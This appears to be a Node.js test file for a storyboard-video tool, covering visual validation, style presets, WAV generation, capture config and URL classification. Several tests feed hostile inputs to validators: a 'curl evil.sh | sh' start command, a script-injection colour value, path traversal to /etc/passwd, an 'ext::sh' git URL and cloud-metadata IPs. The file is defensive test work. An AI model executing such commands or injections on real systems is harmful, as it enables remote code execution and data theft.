import { test } from 'node:test';
import assert from 'node:assert/strict';
import { readFileSync, mkdtempSync, statSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join, dirname } from 'node:path';
import { fileURLToPath } from 'node:url';
import { validate, softWarnings, assetPath, coverage, visualRefs } from '../render.mjs';
import { parseFlow } from '../flowdoc.mjs';
import { validateVisual, VISUAL_TYPES } from '../visuals.mjs';
import { resolveStyle, PRESETS, contrast } from '../style.mjs';
import { generateMusic } from '../music.mjs';
import { validateConfig } from '../capture.mjs';
import { parseColor } from '../detect-style.mjs';

const HERE = dirname(fileURLToPath(import.meta.url));
const ICONS = JSON.parse(readFileSync(join(HERE, '..', 'engine', 'icons.json'), 'utf8'));
const has = (list, re) => list.some((m) => re.test(m));
const visualOnly = (visual) => ({ title: 'T', scenes: [{ caption: 'c', visual }] });

test('storyboards made only of visuals need no nodes; map scenes still do', () => {
  assert.deepEqual(validate(visualOnly({ type: 'checklist', items: [{ label: 'Card valid', ok: true }] })), []);
  assert.ok(has(validate({ title: 'T', scenes: [{ caption: 'c' }] }), /no "visual" and there are no "nodes"/));
});

test('every visual type validates its required data and references', () => {
  assert.equal(VISUAL_TYPES.length, 11);
  assert.ok(has(validateVisual({ type: 'headline' }, 'v', ICONS), /text: the headline/));
  assert.ok(has(validateVisual({ type: 'showcase', callouts: [{ side: 'up' }] }, 'v', ICONS), /needs "src".*or "ui"/));
  assert.deepEqual(validateVisual({ type: 'showcase', ui: { app: 'X', widgets: [{ type: 'ring', value: 80 }] }, callouts: [{ title: 'Live' }] }, 'v', ICONS), []);
  const agents = { type: 'agents', agents: [{ id: 'a', name: 'A' }], tools: [{ id: 't', name: 'T' }],
    steps: [{ from: 'a', to: 'ghost', type: 'message' }, { from: 'a', to: 'a', type: 'tool' }, { from: 'x', type: 'think' }] };
  const e = validateVisual(agents, 'v', ICONS);
  assert.ok(has(e, /steps\[0\]\.to: "ghost"/));
  assert.ok(has(e, /steps\[1\]: a "tool" step needs "to" set to one of the tools/));
  assert.ok(has(e, /steps\[2\]\.from: "x" is not an agent/));
  assert.ok(has(validateVisual({ type: 'pipeline', item: { fields: [['a', '1']] }, stages: [{ label: 'S', effect: 'change', field: 'b' }] }, 'v', ICONS), /field "b" does not exist/));
  assert.ok(has(validateVisual({ type: 'decision', question: 'Q?', options: [{ label: 'only' }] }, 'v', ICONS), /at least two outcomes/));
  assert.ok(has(validateVisual({ type: 'screen', highlights: [{ x: 2, y: 0, w: 1, h: 1 }] }, 'v', ICONS), /src|fractions/));
  assert.ok(has(validateVisual({ type: 'hologram' }, 'v', ICONS), /unknown visual type/));
  assert.deepEqual(validateVisual({ type: 'chat', messages: [{ from: 'user', text: 'hi' }] }, 'v', ICONS), []);
});

test('claims inside visuals are flagged like captions', () => {
  const sb = visualOnly({ type: 'chat', messages: [{ from: 'assistant', text: 'Your refund arrives instantly.' }] });
  validate(sb);
  assert.ok(has(softWarnings(sb), /"instantly"/));
});

test('styles resolve presets, overrides and keep brand colours readable', () => {
  assert.ok(Object.keys(PRESETS).length >= 10);
  const r = resolveStyle({ style: { preset: 'neural', theme: 'dark', accent: '#101010', font: { family: 'Inter' } } }, HERE);
  assert.deepEqual(r.errors, []);
  assert.ok(contrast(r.style.accent, r.style.colors.bg) >= 3, 'dark accent nudged on dark background');
  assert.ok(has(r.warnings, /low contrast/));
  assert.match(r.style.font.family, /^Inter, /);
  assert.ok(has(resolveStyle({ style: { preset: 'nope' } }, HERE).errors, /unknown/));
  assert.equal(resolveStyle({ theme: 'light' }, HERE).style.preset, 'daylight');
  for (const [name, p] of Object.entries(PRESETS)) assert.ok(contrast(p.colors.text, p.colors.bg) >= 7, `${name} text contrast`);
});

test('style values that reach CSS or HTML are validated', () => {
  const bad = resolveStyle({ style: { preset: 'launch', colors: { card: 'red;}</style><script>alert(1)</script>' } } }, HERE);
  assert.ok(has(bad.errors, /style\.colors\.card must be/));
  assert.deepEqual(resolveStyle({ style: { colors: { panel: 'rgba(10,15,30,0.8)', card: '#121A30' } } }, HERE).errors, []);
  assert.ok(has(resolveStyle({ style: { font: { family: 'Inter; } body { background:url(x)' } } }, HERE).errors, /font\.family/));
  assert.match(resolveStyle({ style: { font: { family: 'IBM Plex Sans, Inter' } } }, HERE).style.font.family, /^"IBM Plex Sans", Inter, /);
});

test('background is white by default, adapts to any colour, and --bg wins', () => {
  for (const name of Object.keys(PRESETS)) {
    const st = resolveStyle({ style: { preset: name } }, HERE).style;
    assert.equal(st.colors.bg, '#FFFFFF', `${name} defaults to white`);
    assert.equal(st.theme, 'light');
    assert.ok(contrast(st.colors.text, st.colors.bg) >= 7 && contrast(st.colors.muted, st.colors.bg) >= 4.5, `${name} text readable on white`);
    assert.ok(contrast(st.accent, st.colors.bg) >= 3, `${name} accent readable on white`);
    const dk = resolveStyle({ style: { preset: name, theme: 'dark' } }, HERE).style;
    assert.equal(dk.theme, 'dark');
    assert.ok(contrast(dk.colors.text, dk.colors.bg) >= 7, `${name} dark text readable`);
  }
  for (const bg of ['#F3EFE6', '#0E2A2A', '#FFE4F1', '#1E1B4B', '#808080']) {
    const st = resolveStyle({ style: { preset: 'launch', bg } }, HERE).style;
    assert.equal(st.colors.bg, bg);
    const best = Math.max(contrast('#000000', bg), contrast('#FFFFFF', bg));
    assert.ok(contrast(st.colors.text, bg) >= Math.min(7, best - 0.01), `text on ${bg}`);
    assert.ok(contrast(st.colors.muted, bg) >= 4.5, `muted on ${bg}`);
  }
  assert.equal(resolveStyle({ style: { preset: 'launch', bg: '#FFFFFF' } }, HERE, 'dark').style.theme, 'dark');
  assert.ok(has(resolveStyle({ style: { bg: 'blue' } }, HERE).errors, /hex/));
  assert.equal(resolveStyle({ style: { preset: 'launch' } }, HERE).warnings.length, 0, 'adapting a preset is not the user\'s problem');
});

test('brand colours parse from every common notation', () => {
  assert.equal(parseColor('#0ea5e9'), '#0EA5E9');
  assert.equal(parseColor('#FF0EA5E9'), '#0EA5E9');
  assert.equal(parseColor('0xFF0EA5E9'), '#0EA5E9');
  assert.equal(parseColor('rgb(14, 165, 233)'), '#0EA5E9');
  assert.equal(parseColor('199 89% 48%'), parseColor('hsl(199, 89%, 48%)'));
  assert.match(parseColor('oklch(0.685 0.169 237.3)'), /^#[0-9A-F]{6}$/);
  assert.equal(parseColor('var(--x)'), null);
});

test('generated music is a valid stereo WAV of the requested length', () => {
  const f = join(mkdtempSync(join(tmpdir(), 'cfv-')), 'm.wav');
  generateMusic(f, { duration: 6, boundaries: [2, 4], style: { preset: 'storefront', motion: 'snappy' } });
  const b = readFileSync(f);
  assert.equal(b.toString('ascii', 0, 4), 'RIFF');
  assert.equal(b.readUInt16LE(22), 2);
  const seconds = (statSync(f).size - 44) / (44100 * 4);
  assert.ok(seconds >= 6 && seconds < 7.5, `length ${seconds}`);
});

test('capture refuses shell commands, other sites and folders outside the repo', () => {
  const e = validateConfig({ url: 'http://localhost:3000', start: 'npm run dev; curl evil.sh | sh', cwd: '../..',
    pages: [{ id: 'a', path: '//evil.example/x', actions: [{ goto: 'https://evil.example' }] }] });
  assert.ok(has(e, /"start" must be one plain command/));
  assert.ok(has(e, /"cwd" must be a folder inside the repo/));
  assert.ok(has(e, /path must start with a single \//));
  assert.ok(has(e, /goto must start with a single \//));
  assert.deepEqual(validateConfig({ url: 'http://localhost:4173', start: 'python3 -m http.server 4173 --directory site', pages: [{ id: 'a', path: '/' }] }), []);
});

test('storyboard assets must be images or fonts inside the project', () => {
  const sbDir = join(HERE, 'fixtures', 'polyglot', 'flow-video');
  assert.ok(assetPath(sbDir, '../../../../../../etc/hosts.png', /\.png$/).error);
  assert.ok(assetPath(sbDir, '/etc/passwd', /\.png$/).error);
  assert.ok(assetPath(sbDir, 'screens/a.txt', /\.png$/).error);
  assert.ok(assetPath(sbDir, '../web/logo.png', /\.png$/).file);
});

test('capture config refuses secrets and bad pages', () => {
  assert.deepEqual(validateConfig({ url: 'http://localhost:3000', pages: [{ id: 'home', path: '/' }], env: { STRIPE_SECRET_KEY: 'sk_test_demo' } }), []);
  const e = validateConfig({ url: 'localhost', pages: [{ id: 'a b', path: 'x', actions: [{ dance: 1 }] }], env: { API_KEY: 'live-123' } });
  assert.ok(has(e, /"url" must be/));
  assert.ok(has(e, /id must be/));
  assert.ok(has(e, /path must start/));
  assert.ok(has(e, /actions\[0\]/));
  assert.ok(has(e, /env\.API_KEY looks like a real secret/));
});

const FLOW3 = parseFlow([
  '## Pipelines', '### 1. A',
  "1. **P1.1 One**: `a.js:1` `const one = 1;`", "2. **P1.2 Two**: `a.js:2` `const two = 2;`", "   - Branch B1: x",
  '### 2. B', "1. **P2.1 Three**: `b.js:1` `const three = 3;`",
  '## Branch index', "| B1 | `a.js:2` `if (two > one)` | c | d |",
].join('\n'));

test('every FLOW.md step must be shown or omitted; refs inside visual elements count', () => {
  const sb = { title: 'T', scenes: [{ caption: 'c', ref: 'P1.1', visual: { type: 'decision', question: 'Q?', options: [{ label: 'a', ref: 'B1' }, { label: 'b' }] } }] };
  const errs = validate(sb, FLOW3);
  assert.ok(has(errs, /2 of 3 FLOW\.md steps are not shown.*P1\.2, P2\.1/));
  sb.scenes[0].visual.options[1].ref = 'P1.2';
  sb.omitted = [{ ref: 'P2', reason: 'second pipeline gets its own video' }];
  assert.deepEqual(validate(sb, FLOW3), []);
  assert.deepEqual(visualRefs(sb.scenes[0].visual), ['B1', 'P1.2']);
  assert.deepEqual(coverage(sb, FLOW3), { steps: 3, stepsShown: 2, stepsOmitted: 1, branches: 1, branchesShown: 1, branchesOmitted: 0 });
  sb.omitted = [{ ref: 'P9', reason: 'x' }];
  assert.ok(has(validate(sb, FLOW3), /no steps in FLOW\.md start with P9/));
});

test('story fields are validated and long text is flagged before it can overlap', () => {
  const sb = { title: 'T', journey: { icon: 'cart' }, intro: { highlights: [{ icon: 'nope' }] },
    scenes: [{ caption: 'c', chapter: '', transition: 'spin', visual: { type: 'agents', agents: [{ id: 'a', name: 'A very long agent name' }] } }] };
  const errs = validate(sb);
  assert.ok(has(errs, /"journey" needs "item"/));
  assert.ok(has(errs, /highlights\[0\] needs "label"/));
  assert.ok(has(errs, /chapter must be a short title/));
  assert.ok(has(errs, /transition must be/));
  const ok = { title: 'T', scenes: [{ caption: 'c', visual: { type: 'agents', agents: [{ id: 'a', name: 'A very long agent name' }] } }] };
  assert.deepEqual(validate(ok), [], 'cast-only agents scene is valid');
  assert.ok(has(softWarnings(ok), /agents\[0\]\.name .* keep it to 2/));
});

test('headline and showcase scenes may skip the caption; other scenes may not', () => {
  assert.deepEqual(validate({ title: 'T', scenes: [{ visual: { type: 'headline', text: 'Smart control' } }, { visual: { type: 'showcase', ui: { app: 'X' } } }] }), []);
  assert.ok(has(validate({ title: 'T', scenes: [{ visual: { type: 'checklist', items: [{ label: 'a' }] } }] }), /missing "caption"/));
});

test('URLs are classified as git repositories, websites or refused', async () => {
  const { classify } = await import('../fetch-source.mjs');
  assert.deepEqual(classify('https://github.com/vercel/next.js/tree/canary/packages/next'),
    { kind: 'git', clone: 'https://github.com/vercel/next.js.git', host: 'github.com', owner: 'vercel', repo: 'next.js', branch: 'canary', sub: 'packages/next' });
  assert.equal(classify('git@github.com:org/repo.git').kind, 'git');
  assert.equal(classify('https://example.com/pricing').kind, 'site');
  for (const bad of ['file:///etc/passwd', 'ext::sh -c touch', 'javascript:alert(1)', 'not a url']) assert.equal(classify(bad).kind, 'invalid', bad);
  assert.equal(classify('https://user:pw@example.com/').kind, 'invalid', 'credentials in URL');
  const { isPrivateIp } = await import('../fetch-source.mjs');
  for (const ip of ['127.0.0.1', '10.1.2.3', '172.20.0.1', '192.168.1.1', '169.254.169.254', '100.64.0.1', '0.0.0.0', '::1', 'fd00::1', 'fe80::1', '::ffff:127.0.0.1'])
    assert.ok(isPrivateIp(ip), `${ip} is private`);
  for (const ip of ['8.8.8.8', '140.82.112.3', '2606:4700::1111']) assert.ok(!isPrivateIp(ip), `${ip} is public`);
});
